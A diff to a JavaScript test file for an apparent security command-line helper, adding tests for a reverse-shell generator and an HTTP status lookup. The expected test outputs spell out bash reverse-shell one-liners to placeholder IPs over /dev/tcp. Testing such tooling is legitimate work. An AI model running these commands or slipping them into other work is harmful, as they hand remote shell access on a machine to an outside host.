@@ -456,6 +456,11 @@ group("command registry (batch 1)");
     ok("jwt flags alg=none", CMD_MAP.jwt.run({ rest: [none], c: plain }).includes("warning: alg=none"));
     ok("jwt rejects non-JWT with usage", CMD_MAP.jwt.run({ rest: ["not-a-jwt"], c: plain }).includes("not a valid JWT"));
   }
+  eq("revshell bash exact", CMD_MAP.revshell.run({ rest: ["bash", "10.10.14.7", "4444"], c: plain }), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
+  ok("revshell defaults (no args) -> bash/10.0.0.1/4444", CMD_MAP.revshell.run({ rest: [], c: plain }) === "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
+  ok("revshell unknown lang falls back to bash", CMD_MAP.revshell.run({ rest: ["zzz", "1.2.3.4", "9001"], c: plain }).startsWith("bash -i"));
+  eq("status 404 (plain)", CMD_MAP.status.run({ rest: ["404"], c: plain }), "404 Not Found  · 4xx client error");
+  ok("status unknown code -> usage", CMD_MAP.status.run({ rest: ["999"], c: plain }).includes("unknown status code"));
   // registry commands must NOT also have a leftover 'cmd === ' branch (no double dispatch)
   const src = fs.readFileSync(path.join(__dirname, "..", "sentinel.js"), "utf8");
   const doubled = CMDS.flatMap((cmd) => [cmd.name, ...(cmd.aliases || [])]).filter((n) => src.includes('cmd === "' + n + '"'));
